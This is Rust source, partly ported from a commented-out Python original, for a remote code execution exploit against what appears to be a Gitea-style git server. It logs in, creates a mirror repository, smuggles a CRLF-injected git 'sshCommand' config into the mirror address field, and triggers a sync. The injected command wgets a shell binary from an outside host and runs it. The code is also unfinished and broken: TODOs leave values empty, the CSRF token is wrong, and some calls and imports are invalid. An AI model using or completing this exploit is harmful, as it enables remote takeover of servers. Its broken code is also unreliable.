//     import re
// import os
// import sys
// import random
// import string
// import requests
// import tempfile
// import threading
// import http.server
// import socketserver
// import urllib.parse
// from functools import partial
use anyhow::Result;
use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use regex::Regex;
use reqwest::Client;
use std::iter;
use std::{env, process::exit, time::Duration};
use tokio::process::Command;

#[tokio::main]
async fn main() -> Result<()> {
    let username = "test";
    let password = "password123";
    let host_addr = "192.168.1.1";
    let host_port = 3000;
    let taregt_url = "http://192.168.1.2:3000".trim_end_matches("/").to_string();
    let cmd =
        "wget http://192.168.1.1:8080/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell";

    // Login
    let http_timeout = Duration::from_secs(10);
    let http_client = Client::builder()
        .timeout(http_timeout)
        .cookie_store(true)
        .build()?;

    println!("Logging in");

    let body1 = [("user_name", username), ("password", password)];
    let url1 = format!("{}/user/login", taregt_url);
    let res1 = http_client.post(url1).form(&body1).send().await?;
    if res1.status().as_u16() != 200 {
        println!("Login unsuccessful");
        exit(1);
    }

    println!("Logged in successfully");

    println!("Retrieving user ID");

    let res2 = http_client.get(format!("{}/", taregt_url)).send().await?;
    if res2.status().as_u16() != 200 {
        println!("Could not retrieve user ID");
        exit(1);
    }

    let regexp_res2 =
        Regex::new(r#"<meta name="_uid" content="(.+)" />"#).expect("compiling regexp_res2");
    let body_res2 = res2.text().await?;
    let user_id = regexp_res2
        .captures_iter(&body_res2)
        .filter_map(|captures| captures.get(0))
        .map(|captured| captured.as_str().to_string())
        .collect::<Vec<String>>()
        .remove(0);

    println!("Retrieved user ID: {}", &user_id);

    // Hosting the repository to clone

    // here we use an sync function in an aync function, but it's okay as we are developing an epxloit, no extreme performance
    // is required
    let git_temp = tempfile::tempdir()?;

    let _ = Command::new("git")
        .arg("init")
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("git")
        .args(&["config", "user.email", "x@x.com"])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("git")
        .args(&["config", "user.name", "x"])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("touch")
        .args(&["x"])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("git")
        .args(&["add", "x"])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("git")
        .args(&["commit", "-m", "x"])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let git_temp_path_str = git_temp
        .path()
        .to_str()
        .expect("converting git_temp_path to &str");
    let git_temp_repo = format!("{}.git", git_temp_path_str);
    let _ = Command::new("git")
        .args(&["clone", "--bare", git_temp_path_str, git_temp_repo.as_str()])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("git")
        .args(&["update-server-info"])
        .current_dir(git_temp_repo)
        .spawn()?
        .wait()
        .await?;

    let endpoint = format!("{}:{}", &host_addr, host_port);

    // see here for how to run actix-web in a tokio runtime https://github.com/actix/actix-web/issues/1283
    let actix_system = actix_web::rt::System::with_tokio_rt(|| {
        stdx::tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
            .expect("building actix's web runtime")
    });

    tokio::task::spawn_blocking(move || {
        actix_system.block_on(async move {
            HttpServer::new(move || {
                App::new().service(
                    actix_files::Files::new("/", "/tmp")
                        .prefer_utf8(true)
                        .index_file("index.html"),
                )
            })
            .bind(endpoint)?
            .run()
            .await?;
        });
    });

    // handler = partial(http.server.SimpleHTTPRequestHandler,directory='/tmp')
    // socketserver.TCPServer.allow_reuse_address = True
    // httpd = socketserver.TCPServer(("", HOST_PORT), handler)
    // t = threading.Thread(target=httpd.serve_forever)
    // t.start()
    // print('Created temporary git server to host {}.git'.format(gitTemp))

    println!("Created temporary git server to host {}", &git_temp_repo);

    println!("Creating repository");
    let mut rng = thread_rng();
    let repo_name: String = iter::repeat(())
        .map(|()| rng.sample(Alphanumeric))
        .map(char::from)
        .take(8)
        .collect();

    let clone_addr = String::new(); // TODO 'clone_addr': 'http://{}:{}/{}.git'.format(HOST_ADDR, HOST_PORT, gitTemp[5:]),

    let body3 = [
        ("_csrf", username), // TODO  urllib.parse.unquote(s.cookies.get('_csrf'))
        ("uid", user_id.as_str()),
        ("repo_name", repo_name.as_str()),
        ("clone_addr", clone_addr.as_str()),
        ("mirror", "on"),
    ];
    let res3 = http_client
        .post(format!("{}/repo/migrate", taregt_url))
        .form(&body3)
        .send()
        .await?;
    if res3.status().as_u16() != 200 {
        println!("Error creating repo");
        exit(1);
    }

    println!("Repo {} created", &repo_name);

    println!("Injecting command into repo");
    let body4 = [
        ("_csrf", username), // urllib.parse.unquote(s.cookies.get('_csrf')),
        (
            "mirror_address",
            format!(
                r#"ssh://example.com/x/x"""\r\n[core]\r\nsshCommand="{}"\r\na=""""#,
                &cmd
            ),
        ),
        ("action", "mirror"),
        ("enable_prune", "on"),
        ("interval", "8h0m0s"),
    ];
    let res4 = http_client
        .post(format!(
            "{}/{}/{}/settings",
            taregt_url, &username, &repo_name
        ))
        .form(&body4)
        .send()
        .await?;
    if res4.status().as_u16() != 200 {
        println!("Error injecting command");
        exit(1);
    }

    println!("Command injected");

    println("Triggering command");
    let body5 = [
        ("_csrf", username), // urllib.parse.unquote(s.cookies.get('_csrf')),
        ("action", "mirror-sync"),
    ];
    let res5 = http_client
        .post(format!(
            "{}/{}/{}/settings",
            taregt_url, &username, &repo_name
        ))
        .form(&body5)
        .send()
        .await?;
    if res5.status().as_u16() != 200 {
        println!("Error triggering command");
        exit(1);
    }

    println!("Command triggered");

    Ok(())
}
